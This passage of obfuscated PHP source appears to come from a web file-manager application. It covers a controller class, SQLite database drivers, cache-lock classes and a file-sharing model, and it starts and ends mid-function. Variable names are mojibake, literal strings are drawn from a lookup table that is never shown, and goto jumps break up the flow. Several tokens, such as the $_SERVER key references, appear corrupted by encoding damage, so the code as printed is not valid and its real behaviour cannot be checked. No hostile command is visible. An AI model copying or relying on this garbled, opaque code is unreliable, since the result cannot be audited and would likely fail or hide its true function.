ÀÔ˜ªĞ[177]] = $ƒ§Àøş†; $Ù¼©’ê²[$ ÀÔ˜ªĞ[176]] = $¥²’Òï¢; $üŸş¸’Ó[$¥²’Òï¢][] =& $Ù¼©’ê²; if (count($üŸş¸’Ó[$¥²’Òï¢]) > 1) { $Ù¼©’ê²[$ ÀÔ˜ªĞ[614]] = !0; } Hook::trigger($ ÀÔ˜ªĞ[616], $Ù¼©’ê²); } unset($Ù¼©’ê²); $ã’“ñÄ = array($ ÀÔ˜ªĞ[176] => array($ ÀÔ˜ªĞ[7], array_keys($üŸş¸’Ó))); $ïÜÌèÂÛ = Model($ ÀÔ˜ªĞ[617]); $„ öÔÃı = $ïÜÌèÂÛ->where($ã’“ñÄ)->select(); $„ öÔÃı = $„ öÔÃı ? $„ öÔÃı : array(); foreach ($„ öÔÃı as $Å­¿¿çæ) { if (!isset($üŸş¸’Ó[$Å­¿¿çæ[$ ÀÔ˜ªĞ[176]]])) { continue; } $š›€Ø€ = $üŸş¸’Ó[$Å­¿¿çæ[$ ÀÔ˜ªĞ[176]]]; foreach ($š›€Ø€ as &$Ù¼©’ê²) { $Ù¼©’ê²[$ ÀÔ˜ªĞ[476]] = $Å­¿¿çæ[$ ÀÔ˜ªĞ[476]]; $Ù¼©’ê²[$ ÀÔ˜ªĞ[614]] = !0; } unset($Ù¼©’ê²); } $áåıàİé = array(); foreach ($“©»Ÿ” as $¦°†œæÊ) { Hook::trigger($ ÀÔ˜ªĞ[618], $¦°†œæÊ); if (isset($¦°†œæÊ[$ ÀÔ˜ªĞ[614]]) && $¦°†œæÊ[$ ÀÔ˜ªĞ[614]]) { Hook::trigger($ ÀÔ˜ªĞ[619], $¦°†œæÊ); continue; } $ğÅİ†¸ = $›‘—Ûª->getPathInner($¦°†œæÊ[$ ÀÔ˜ªĞ[84]]); $ËåÙãºø = $ïÜÌèÂÛ->addFileMake($ğÅİ†¸, $¦°†œæÊ[$ ÀÔ˜ªĞ[76]], $¦°†œæÊ[$ ÀÔ˜ªĞ[177]], $¦°†œæÊ[$ ÀÔ˜ªĞ[176]], $¦°†œæÊ[$ ÀÔ˜ªĞ[32]], $Äğµå‡); Hook::trigger($ ÀÔ˜ªĞ[619], $¦°†œæÊ); if (!is_array($ËåÙãºø)) { continue; } $áåıàİé[] = $ËåÙãºø; } $ïÜÌèÂÛ->addAll($áåıàİé); $ã’“ñÄ = array($ ÀÔ˜ªĞ[176] => array($ ÀÔ˜ªĞ[7], array_keys($üŸş¸’Ó))); $„ öÔÃı = $ïÜÌèÂÛ->where($ã’“ñÄ)->select(); $„ öÔÃı = $„ öÔÃı ? $„ öÔÃı : array(); foreach ($„ öÔÃı as $Å­¿¿çæ) { if (!isset($üŸş¸’Ó[$Å­¿¿çæ[$ ÀÔ˜ªĞ[176]]])) { continue; } $çÁŠßğ =& $üŸş¸’Ó[$Å­¿¿çæ[$ ÀÔ˜ªĞ[176]]]; foreach ($çÁŠßğ as &$Ù¼©’ê²) { $Ù¼©’ê²[$ ÀÔ˜ªĞ[476]] = $Å­¿¿çæ[$ ÀÔ˜ªĞ[476]]; } unset($Ù¼©’ê²); } $ØÒşËŞâ = array(); foreach ($“©»Ÿ” as $öæØ¶¢) { $ØÒşËŞâ[$öæØ¶¢[$ ÀÔ˜ªĞ[32]]] = $öæØ¶¢; } return $ØÒşËŞâ; } } define($_SERVER[ Ö‘ñÄ”][620], $_SERVER[ Ö‘ñÄ”][621]); $mbdwnukvgh = $_SERVER[ Ö‘ñÄ”][622]; goto Aßíï“¯ó; D£‰óê£Í: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $èáĞ‘ôÉ =& $_SERVER[ Ö‘ñÄ”]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$èáĞ‘ôÉ[6]] =& $config; $this->values[$èáĞ‘ôÉ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $èáĞ‘ôÉ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($â¶ö×€Š) { if (1 === func_num_args()) { $this->{$â¶ö×€Š} = new $â¶ö×€Š(); } else { $ŒÑ–ÚÆ = new ReflectionClass($â¶ö×€Š); $ã´Ó¨¿Œ = func_get_args(); array_shift($ã´Ó¨¿Œ); $this->{$â¶ö×€Š} = $ŒÑ–ÚÆ->newInstanceArgs($ã´Ó¨¿Œ); } return $this->{$â¶ö×€Š}; } public function routeBind($‰©Â²çĞ, $³›Ã½Ö, $ ›ºƒØ© = 3) { $ÔË§¡âÖ =& $_SERVER[ Ö‘ñÄ”]; $õ ˜® = $this->in[$ÔË§¡âÖ[9]]; $‰©Â²çĞ = str_replace($ÔË§¡âÖ[10], $ÔË§¡âÖ[11], trim(trim($‰©Â²çĞ, $ÔË§¡âÖ[8]), $ÔË§¡âÖ[12])); if (!$‰©Â²çĞ || count($õ ˜®) <= $ ›ºƒØ©) { return !1; } $‡ÏÁî¬ = !0; $¯ËóÉÀ = explode($ÔË§¡âÖ[8], $‰©Â²çĞ); for ($¡…ƒ…«û = 0; $¡…ƒ…«û < count($¯ËóÉÀ); $¡…ƒ…«û++) { if ($¯ËóÉÀ[$¡…ƒ…«û] != $õ ˜®[$ ›ºƒØ© + $¡…ƒ…«û]) { $‡ÏÁî¬ = !1; break; } } if (!$‡ÏÁî¬) { return; } call_user_func_array(array($this, $³›Ã½Ö), array()); } public function routeArgs($”ÃåÙ – = 3) { $–‹ãıÛ© = $this->in[$_SERVER[ Ö‘ñÄ”][9]]; if (count($–‹ãıÛ©) <= $”ÃåÙ –) { return array(); } $¾ø¦ÁĞ = array(); for ($ÁÒªÂŒº = $”ÃåÙ –; $ÁÒªÂŒº < count($–‹ãıÛ©); $ÁÒªÂŒº += 2) { $¾ø¦ÁĞ[$–‹ãıÛ©[$ÁÒªÂŒº]] = $–‹ãıÛ©[$ÁÒªÂŒº + 1]; $this->in[$–‹ãıÛ©[$ÁÒªÂŒº]] = $–‹ãıÛ©[$ÁÒªÂŒº + 1]; } return $¾ø¦ÁĞ; } protected function assign($Ş àõ, $ï´…ºØ¨) { $this->values[$Ş àõ] = $ï´…ºØ¨; } protected function display($±ã‡¹‹ö) { ob_end_clean(); extract($this->values); require $this->tpl . $±ã‡¹‹ö; } } class DbSqliteBase extends Db { public function __construct($•ÉŞÂŸÜ = '') { $²Ş£¢¶¡ =& $_SERVER[ Ö‘ñÄ”]; if (!extension_loaded($²Ş£¢¶¡[13])) { think_exception(think_lang($²Ş£¢¶¡[14]) . $²Ş£¢¶¡[15]); } if (!empty($•ÉŞÂŸÜ)) { if (!isset($•ÉŞÂŸÜ[$²Ş£¢¶¡[16]])) { $•ÉŞÂŸÜ[$²Ş£¢¶¡[16]] = 438; } $this->config = $•ÉŞÂŸÜ; if (empty($this->config[$²Ş£¢¶¡[17]])) { $this->config[$²Ş£¢¶¡[17]] = array(); } } } public function connect($Ç³ÃêÌÓ = '', $©ï¨ì¹ı = 0) { $š×ŸÕª¬ =& $_SERVER[ Ö‘ñÄ”]; if (!isset($this->linkID[$©ï¨ì¹ı])) { if (empty($Ç³ÃêÌÓ)) { $Ç³ÃêÌÓ = $this->config; } $ê¤é¾Ş = !empty($Ç³ÃêÌÓ[$š×ŸÕª¬[17]][$š×ŸÕª¬[18]]) ? $Ç³ÃêÌÓ[$š×ŸÕª¬[17]][$š×ŸÕª¬[18]] : $this->pconnect; $’èùıÙˆ = $ê¤é¾Ş ? $š×ŸÕª¬[19] : $š×ŸÕª¬[20]; $this->linkID[$©ï¨ì¹ı] = $’èùıÙˆ($Ç³ÃêÌÓ[$š×ŸÕª¬[21]], $Ç³ÃêÌÓ[$š×ŸÕª¬[16]]); if (!$this->linkID[$©ï¨ì¹ı]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$©ï¨ì¹ı], 30000); if (1 != think_config($š×ŸÕª¬[22])) { unset($this->config); } } return $this->linkID[$©ï¨ì¹ı]; } public function free() { $this->queryID = null; } public function query($ìöÛ…Ô ) { $É€ï¶ğ· =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ìöÛ…Ô ; if ($this->queryID) { $this->free(); } think_action_status($É€ï¶ğ·[23], 1); think_status($É€ï¶ğ·[24]); $this->queryID = sqlite_query($this->_linkID, $ìöÛ…Ô ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $™›­ğçĞ = $this->getAll(); return $™›­ğçĞ; } } public function execute($¥Ş²áÈŞ) { $ââø«½ú =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¥Ş²áÈŞ; if ($this->queryID) { $this->free(); } think_action_status($ââø«½ú[25], 1); think_status($ââø«½ú[24]); $›ú¦¥õÊ = sqlite_exec($this->_linkID, $¥Ş²áÈŞ); $this->debug(); if (!1 === $›ú¦¥õÊ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ Ö‘ñÄ”][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $£êÕ‚òü = sqlite_query($this->_linkID, $_SERVER[ Ö‘ñÄ”][27]); if (!$£êÕ‚òü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $‡‚ÆÇƒ = sqlite_query($this->_linkID, $_SERVER[ Ö‘ñÄ”][28]); if (!$‡‚ÆÇƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¯ˆ¸Á— = array(); if ($this->numRows > 0) { for ($©…Ôñ = 0; $©…Ôñ < $this->numRows; $©…Ôñ++) { $¯ˆ¸Á—[$©…Ôñ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¯ˆ¸Á—; } public function getFields($´¯¼ Şç) { $¡ø»Ê®ş =& $_SERVER[ Ö‘ñÄ”]; $†’‡ŞªÇ = $this->query($¡ø»Ê®ş[29] . $´¯¼ Şç . $¡ø»Ê®ş[30]); $‰«¬Ûà— = array(); if ($†’‡ŞªÇ) { foreach ($†’‡ŞªÇ as $”ŸÌşØ† => $‰‹üá“½) { $‰«¬Ûà—[$‰‹üá“½[$¡ø»Ê®ş[31]]] = array($¡ø»Ê®ş[32] => $‰‹üá“½[$¡ø»Ê®ş[31]], $¡ø»Ê®ş[33] => $‰‹üá“½[$¡ø»Ê®ş[34]], $¡ø»Ê®ş[35] => (bool) ($‰‹üá“½[$¡ø»Ê®ş[36]] === $¡ø»Ê®ş[12]), $¡ø»Ê®ş[37] => $‰‹üá“½[$¡ø»Ê®ş[38]], $¡ø»Ê®ş[39] => strtolower($‰‹üá“½[$¡ø»Ê®ş[40]]) == $¡ø»Ê®ş[41], $¡ø»Ê®ş[42] => strtolower($‰‹üá“½[$¡ø»Ê®ş[43]]) == $¡ø»Ê®ş[44]); } } return $‰«¬Ûà—; } public function getTables($ÚÇˆ“ëÔ = '') { $ï‘¶şÁ¦ =& $_SERVER[ Ö‘ñÄ”]; $¯ÙØğßµ = $this->query($ï‘¶şÁ¦[45] . $ï‘¶şÁ¦[46] . $ï‘¶şÁ¦[47]); $‘£•¿Ğê = array(); foreach ($¯ÙØğßµ as $ò—Í… É => $ËÓ‹’œ) { $‘£•¿Ğê[$ò—Í… É] = current($ËÓ‹’œ); } return $‘£•¿Ğê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Òê¶Î›á =& $_SERVER[ Ö‘ñÄ”]; $ìÎ®¾¼ = sqlite_last_error($this->_linkID); $this->error = $ìÎ®¾¼ . $Òê¶Î›á[4] . sqlite_error_string($ìÎ®¾¼); if ($Òê¶Î›á[12] != $this->queryStr) { $this->error .= LNG($Òê¶Î›á[48]) . $this->queryStr; } think_trace($this->error, $Òê¶Î›á[12], $Òê¶Î›á[49]); return $this->error; } public function escapeString($ÌÑé‡Îû) { return sqlite_escape_string($ÌÑé‡Îû); } public function parseLimit($ÖÌä³Ï‚) { $äüæÁŞ² =& $_SERVER[ Ö‘ñÄ”]; $Å‘¡î¾³ = $äüæÁŞ²[12]; if (!empty($ÖÌä³Ï‚)) { $ÖÌä³Ï‚ = explode($äüæÁŞ²[50], $ÖÌä³Ï‚); if (count($ÖÌä³Ï‚) > 1) { $Å‘¡î¾³ .= $äüæÁŞ²[51] . $ÖÌä³Ï‚[1] . $äüæÁŞ²[52] . $ÖÌä³Ï‚[0] . $äüæÁŞ²[53]; } else { $Å‘¡î¾³ .= $äüæÁŞ²[51] . $ÖÌä³Ï‚[0] . $äüæÁŞ²[53]; } } return $Å‘¡î¾³; } } class DbSqlite3Base extends Db { public function __construct($²Ñ‰è³ = '') { $Ú¼Êòš™ =& $_SERVER[ Ö‘ñÄ”]; if (!class_exists($Ú¼Êòš™[54])) { think_exception(think_lang($Ú¼Êòš™[14]) . $Ú¼Êòš™[55]); } if (!empty($²Ñ‰è³)) { if (!isset($²Ñ‰è³[$Ú¼Êòš™[16]])) { $²Ñ‰è³[$Ú¼Êòš™[16]] = 438; } $this->config = $²Ñ‰è³; if (empty($this->config[$Ú¼Êòš™[17]])) { $this->config[$Ú¼Êòš™[17]] = array(); } } } public function connect($äòšŸ™“ = '', $«¯œÏ¤ = 0) { $øïç×¶ó =& $_SERVER[ Ö‘ñÄ”]; if (!isset($this->linkID[$«¯œÏ¤])) { if (empty($äòšŸ™“)) { $äòšŸ™“ = $this->config; } $this->linkID[$«¯œÏ¤] = new SQLite3($äòšŸ™“[$øïç×¶ó[21]]); if (!$this->linkID[$«¯œÏ¤]) { think_exception($this->linkID[$«¯œÏ¤]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$«¯œÏ¤]->busyTimeout(30000); if (1 != think_config($øïç×¶ó[22])) { unset($this->config); } } return $this->linkID[$«¯œÏ¤]; } public function free() { $this->queryID = null; } public function query($¨Ü¡ÚÇœ) { $Ûò‰óÛ =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¨Ü¡ÚÇœ; if ($this->queryID) { $this->free(); } think_action_status($Ûò‰óÛ[23], 1); think_status($Ûò‰óÛ[24]); $this->queryID = $this->_linkID->query($¨Ü¡ÚÇœ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $İüü¶¿Ï = $this->getAll(); $this->numRows = count($İüü¶¿Ï); return $İüü¶¿Ï; } } public function execute($Š…øÎŒÓ) { $Î¨”Œ¼è =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Š…øÎŒÓ; if ($this->queryID) { $this->free(); } think_action_status($Î¨”Œ¼è[25], 1); think_status($Î¨”Œ¼è[24]); $§û²úıÓ = $this->_linkID->exec($Š…øÎŒÓ); $this->debug(); if (!1 === $§û²úıÓ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ Ö‘ñÄ”][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $€“ã¹ñø = $this->_linkID->query($_SERVER[ Ö‘ñÄ”][27]); if (!$€“ã¹ñø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÎÉıçş† = $this->_linkID->query($_SERVER[ Ö‘ñÄ”][28]); if (!$ÎÉıçş†) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $³¤áó…§ = array(); while ($»Ò“Ôß” = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $³¤áó…§[] = $»Ò“Ôß”; } $this->queryID->reset(); return $³¤áó…§; } public function getFields($Õ²’½ª’) { $¹†×â‡÷ =& $_SERVER[ Ö‘ñÄ”]; $şŒÕõ‘Ò = $this->query($¹†×â‡÷[29] . $Õ²’½ª’ . $¹†×â‡÷[30]); $ŠöˆÖ¯î = array(); if ($şŒÕõ‘Ò) { foreach ($şŒÕõ‘Ò as $†ü¨“•à => $Šãç·Ë) { $ŠöˆÖ¯î[$Šãç·Ë[$¹†×â‡÷[32]]] = array($¹†×â‡÷[32] => $Šãç·Ë[$¹†×â‡÷[32]], $¹†×â‡÷[33] => $Šãç·Ë[$¹†×â‡÷[33]], $¹†×â‡÷[35] => (bool) ($Šãç·Ë[$¹†×â‡÷[35]] === $¹†×â‡÷[12]), $¹†×â‡÷[37] => $Šãç·Ë[$¹†×â‡÷[56]], $¹†×â‡÷[39] => (bool) $Šãç·Ë[$¹†×â‡÷[57]], $¹†×â‡÷[42] => (bool) $Šãç·Ë[$¹†×â‡÷[57]]); } } return $ŠöˆÖ¯î; } public function getTables($¶„‚Š—É = '') { $Ó’Š°í =& $_SERVER[ Ö‘ñÄ”]; $ÉÏÕ°â = $this->query($Ó’Š°í[45] . $Ó’Š°í[46] . $Ó’Š°í[47]); $²›öà® = array(); foreach ($ÉÏÕ°â as $´üşôÊã => $ºŞê°ú¼) { $²›öà®[$´üşôÊã] = current($ºŞê°ú¼); } return $²›öà®; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $í’À›Ï =& $_SERVER[ Ö‘ñÄ”]; $this->error = $this->_linkID->lastErrorMsg(); if ($í’À›Ï[12] != $this->queryStr) { $this->error .= LNG($í’À›Ï[48]) . $this->queryStr; } think_trace($this->error, $í’À›Ï[12], $í’À›Ï[49]); return $this->error; } public function escapeString($Ë“¹ú) { $ààÃôÙ =& $_SERVER[ Ö‘ñÄ”]; if ($this->_linkID) { return $this->_linkID->escapeString($Ë“¹ú); } return str_ireplace($ààÃôÙ[58], $ààÃôÙ[59], $Ë“¹ú); } public function parseLimit($İ×”®äû) { $ØßÄ¾–¥ =& $_SERVER[ Ö‘ñÄ”]; $¥×—†¿° = $ØßÄ¾–¥[12]; if (!empty($İ×”®äû)) { $İ×”®äû = explode($ØßÄ¾–¥[50], $İ×”®äû); if (count($İ×”®äû) > 1) { $¥×—†¿° .= $ØßÄ¾–¥[51] . $İ×”®äû[1] . $ØßÄ¾–¥[52] . $İ×”®äû[0] . $ØßÄ¾–¥[53]; } else { $¥×—†¿° .= $ØßÄ¾–¥[51] . $İ×”®äû[0] . $ØßÄ¾–¥[53]; } } return $¥×—†¿°; } } goto cØò‰¬Ã‹Ü; FÄÎºÛ•Ñå: class CacheLockRedis { public function lock($°âïí…Ñ, $şéôö€ï = 10) { $¹©šÛ¯Ç = Cache::init(); $ïÂ¦ŒûÔ = microtime(!0) + $şéôö€ï; while (microtime(!0) < $ïÂ¦ŒûÔ) { $è‹ÒÄµ¥ = $¹©šÛ¯Ç->get($°âïí…Ñ); if (!$è‹ÒÄµ¥) { $†ÍÚáĞ° = $¹©šÛ¯Ç->setLock($°âïí…Ñ, $ïÂ¦ŒûÔ, $şéôö€ï); if ($†ÍÚáĞ°) { return !0; } } else { if ($è‹ÒÄµ¥ < microtime(!0)) { $¹©šÛ¯Ç->set($°âïí…Ñ, $ïÂ¦ŒûÔ, $şéôö€ï * 2); if ($¹©šÛ¯Ç->get($°âïí…Ñ) === $è‹ÒÄµ¥) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ÿ÷öâ¯¬) { return Cache::init()->get($Ÿ÷öâ¯¬); } public function unlock($ÎŒ‘©Úı) { return Cache::init()->remove($ÎŒ‘©Úı); } } class CacheLockMemcached { public function lock($¡÷ª‰Ë¾, $Û¹ÖóëË = 0) { $ÕõŞÊûŠ = Cache::init(); $Ì´ú³Ë„ = microtime(!0) + $Û¹ÖóëË; while (microtime(!0) < $Ì´ú³Ë„) { $áµ÷ÇÁç = $ÕõŞÊûŠ->get($¡÷ª‰Ë¾); if (!$áµ÷ÇÁç || $áµ÷ÇÁç < microtime(!0)) { $Ì¿©–€ = $ÕõŞÊûŠ->handle->add($¡÷ª‰Ë¾, $Ì´ú³Ë„, $Û¹ÖóëË); if ($Ì¿©–€) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¸›£ğŒµ) { return Cache::init()->get($¸›£ğŒµ); } public function unlock($ôç¸Äáì) { return Cache::init()->remove($ôç¸Äáì); } } class CacheLockDatabase { public function lock($£¡³˜¸•, $¼ºòîïº = 0) { $˜¶’çÎ© = Model($_SERVER[ Ö‘ñÄ”][842]); $˜î¦³½Í = microtime(!0) + $¼ºòîïº; while (microtime(!0) < $˜î¦³½Í) { $àºÃÆ © = $˜¶’çÎ©->get($£¡³˜¸•); if (!$àºÃÆ © || $àºÃÆ © < microtime(!0)) { $Å­†âµ = $˜¶’çÎ©->set($£¡³˜¸•, $˜î¦³½Í); if ($Å­†âµ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Æ÷‘Ğá€) { return Model($_SERVER[ Ö‘ñÄ”][842])->get($Æ÷‘Ğá€); } public function unlock($â±Œ§ßú) { Model($_SERVER[ Ö‘ñÄ”][842])->remove($â±Œ§ßú); } } goto Fùˆîé¿‚­; A¹Ú¿¼°: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\151\146\x79\x54\x69\155\x65", "\164\x69\155\145", "\x69\156\x73\145\x72\x74\x2c\165\x70\x64\x61\164\x65", "\x66\165\x6e\143\164\151\157\x6e"), array("\x63\x72\145\x61\164\145\x54\151\155\x65", "\164\151\x6d\x65", "\x69\x6e\x73\145\x72\164", "\146\165\x6e\x63\x74\x69\157\156"), array("\x6f\160\x74\x69\157\x6e\163", '', "\151\x6e\x73\145\x72\164\x2c\x75\160\144\x61\x74\145\54\163\x65\154\145\x63\x74", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($øêœô„ø) { $ùû‚™ç— =& $_SERVER[ Ö‘ñÄ”]; $ã’àõµ = isset($øêœô„ø[0]) ? $øêœô„ø[0] : !1; return array($ùû‚™ç—[1975] => array(USER_ID, $ùû‚™ç—[1976]), $ùû‚™ç—[1916] => array($ã’àõµ, $ùû‚™ç—[1977])); } protected function listSimple() { $¿èçêÎ’ = array($_SERVER[ Ö‘ñÄ”][1663] => USER_ID); $Ø‘ç±‰¹ = $this->field($this->fieldList)->where($¿èçêÎ’)->select(); return $Ø‘ç±‰¹ ? $Ø‘ç±‰¹ : array(); } protected function getInfo($ÏÇšõ–, $İ„¸ª©³ = false) { $ÔŠ­öÀ† =& $_SERVER[ Ö‘ñÄ”]; if ($İ„¸ª©³) { return $this->_getShareInfo(array($ÔŠ­öÀ†[497] => $ÏÇšõ–)); } $Â“‘›à = $this->cacheFunctionGet($ÔŠ­öÀ†[1918], $ÏÇšõ–); return $Â“‘›à; } public function getInfoByHash($Š¹ïúùˆ) { return $this->_getShareInfo(array($_SERVER[ Ö‘ñÄ”][499] => $Š¹ïúùˆ)); } public function getInfoByPath($êç¹ƒØƒ) { $²ú™—¢» =& $_SERVER[ Ö‘ñÄ”]; $ùßÌÕŞ£ = array($²ú™—¢»[1663] => USER_ID, $²ú™—¢»[410] => $êç¹ƒØƒ); return $this->_getShareInfo($ùßÌÕŞ£); } public function getInfoBySourcePath($¾µ‘¿Àø) { $«¦«ì‹Ã =& $_SERVER[ Ö‘ñÄ”]; $½®Ó¯ÌÁ = array($«¦«ì‹Ã[1663] => USER_ID, $«¦«ì‹Ã[1182] => $¾µ‘¿Àø); return $this->_getShareInfo($½®Ó¯ÌÁ); } private function _getShareInfo($àÄ©–•Ò) { $‡È¦Í‡ï =& $_SERVER[ Ö‘ñÄ”]; $û’˜õ = $this->where($àÄ©–•Ò)->find(); if (!$û’˜õ) { return !1; } $àÄ©–•Ò = array($‡È¦Í‡ï[497] => $û’˜õ[$‡È¦Í‡ï[497]]); $ö†¥Ø³ = $‡È¦Í‡ï[1978]; $”âûÚ¢¦ = Model($‡È¦Í‡ï[610])->order($‡È¦Í‡ï[407])->field($ö†¥Ø³)->where($àÄ©–•Ò)->select(); if ($û’˜õ[$‡È¦Í‡ï[410]] == $‡È¦Í‡ï[197]) { $û’˜õ[$‡È¦Í‡ï[86]] = IO::info($û’˜õ[$‡È¦Í‡ï[1182]]); } else { $û’˜õ[$‡È¦Í‡ï[86]] = Model($‡È¦Í‡ï[1333])->pathInfo($û’˜õ[$‡È¦Í‡ï[410]]); } $û’˜õ[$‡È¦Í‡ï[1979]] = $”âûÚ¢¦; return $û’˜õ; } protected function getInfoAuth($£Àı“’š) { $¬ˆò¶¢à =& $_SERVER[ Ö‘ñÄ”]; $ËÙÙƒŠ¥ = $this->getInfo($£Àı“’š); if ($ËÙÙƒŠ¥[$¬ˆò¶¢à[1663]] == USER_ID) { $ËÙÙƒŠ¥[$¬ˆò¶¢à[421]] = $ËÙÙƒŠ¥[$¬ˆò¶¢à[86]][$¬ˆò¶¢à[421]]; } else { $ËÙÙƒŠ¥[$¬ˆò¶¢à[421]] = Model($¬ˆò¶¢à[510])->authMake($ËÙÙƒŠ¥[$¬ˆò¶¢à[1979]]); } return $ËÙÙƒŠ¥; } protected function listData($ ¦õí¥Ñ = null, $Éç³÷ÅÌ = 300) { $ìãô´Úß =& $_SERVER[ Ö‘ñÄ”]; $ü–äŸŞŞ = array(array($ìãô´Úß[502] => array($ìãô´Úß[1018], 0), $ìãô´Úß[504] => array($ìãô´Úß[1018], 0), $ìãô´Úß[1980] => $ìãô´Úß[1934])); if ($ ¦õí¥Ñ == $ìãô´Úß[1981]) { $ü–äŸŞŞ = array($ìãô´Úß[502] => 1); } else { if ($ ¦õí¥Ñ == $ìãô´Úß[1167]) { $ü–äŸŞŞ = array($ìãô´Úß[504] => 1); } } $ü–äŸŞŞ[$ìãô´Úß[1663]] = USER_ID; $ÆéÙë¼ë = $this->where($ü–äŸŞŞ)->selectPage($Éç³÷ÅÌ); return $ÆéÙë¼ë; } protected function listToMe($ÖõÊùÈı = 300) { $şñªç£† =& $_SERVER[ Ö‘ñÄ”]; $±‰ “æ = Model($şñªç£†[1982])->userGroupParents(USER_ID); $ß‡æ‚æ¸ = array($şñªç£†[594] => SourceModel::TYPE_USER, $şñªç£†[513] => USER_ID); if ($±‰ “æ) { $ß‡æ‚æ¸ = array(array($şñªç£†[594] => SourceModel::TYPE_USER, $şñªç£†[513] => USER_ID), array($şñªç£†[594] => SourceModel::TYPE_GROUP, $şñªç£†[513] => array($şñªç£†[7], $±‰ “æ)), $şñªç£†[1980] => $şñªç£†[1934]); } $Úª•ßİœ = Model($şñªç£†[610])->where($ß‡æ‚æ¸)->selectPage($ÖõÊùÈı); $Ø‹‚–¨ç = array_to_keyvalue_group($Úª•ßİœ[$şñªç£†[378]], $şñªç£†[497]); if (!$Ø‹‚–¨ç) { return $Úª•ßİœ; } $úÈÂ‰â = $şñªç£†[1983]; $ß‡æ‚æ¸ = array($şñªç£†[497] => array($şñªç£†[426], array_keys($Ø‹‚–¨ç)), $şñªç£†[1663] => array($şñªç£†[1020], $şñªç£†[197])); $¥ßıôæ = $this->field($úÈÂ‰â)->where($ß‡æ‚æ¸)->select(); foreach ($¥ßıôæ as $“ƒ©­„£ => &$ƒ±ÏåÂ) { $ƒ±ÏåÂ[$şñªç£†[1979]] = $Ø‹‚–¨ç[$ƒ±ÏåÂ[$şñªç£†[497]]]; } unset($ƒ±ÏåÂ); $ˆ“í³õü = array($şñªç£†[1984] => $¥ßıôæ, $şñªç£†[1985] => $Úª•ßİœ[$şñªç£†[375]]); return $ˆ“í³õü; } protected function shareAdd($”™µÒ¦â, $¤¸£–·ë) { $Ë×ÀŠıİ =& $_SERVER[ Ö‘ñÄ”]; $ø±Ï™¨ = $this->_addShareData($”™µÒ¦â, $¤¸£–·ë); if (!empty($¤¸£–·ë[$Ë×ÀŠıİ[1986]])) { $this->_shareAuthSet($ø±Ï™¨, $¤¸£–·ë[$Ë×ÀŠıİ[1986]]); } $this->shareEventAdd($”™µÒ¦â, $¤¸£–·ë, $Ë×ÀŠıİ[1170]); return $ø±Ï™¨; } protected function shareAddSystem($Ä·ÉÀ—Ş, $÷–Öñğ) { $ç©ñˆä² =& $_SERVER[ Ö‘ñÄ”]; $š¤”Ûê = $this->_addShareData($Ä·ÉÀ—Ş, $÷–Öñğ, $ç©ñˆä²[1282]); $this->_shareAuthSet($š¤”Ûê, $÷–Öñğ[$ç©ñˆä²[1986]]); return $š¤”Ûê; } private function shareEventAdd($ü¶ƒŠ Ú, $¾İÌµÚÔ, $ú·™•¶ = "\x61\144\x64") { $§›–ÎÒ =& $_SERVER[ Ö‘ñÄ”]; if (!$ü¶ƒŠ Ú || $ü¶ƒŠ Ú == $§›–ÎÒ[197]) { return; } if ($ú·™•¶ == $§›–ÎÒ[1170]) { if ($¾İÌµÚÔ[$§›–ÎÒ[502]] == $§›–ÎÒ[88]) { Model($§›–ÎÒ[578])->eventShare($ü¶ƒŠ Ú, $§›–ÎÒ[1987]); } if ($¾İÌµÚÔ[$§›–ÎÒ[504]] == $§›–ÎÒ[88]) { Model($§›–ÎÒ[578])->eventShare($ü¶ƒŠ Ú, $§›–ÎÒ[1988]); } return; } $´ä‡ü€ = $this->getInfoByPath($ü¶ƒŠ Ú); $Å¾¿³âÎ = $§›–ÎÒ[1989]; if ($´ä‡ü€[$§›–ÎÒ[502]] == $§›–ÎÒ[197] && $¾İÌµÚÔ[$§›–ÎÒ[502]] == $§›–ÎÒ[88]) { $Å¾¿³âÎ = 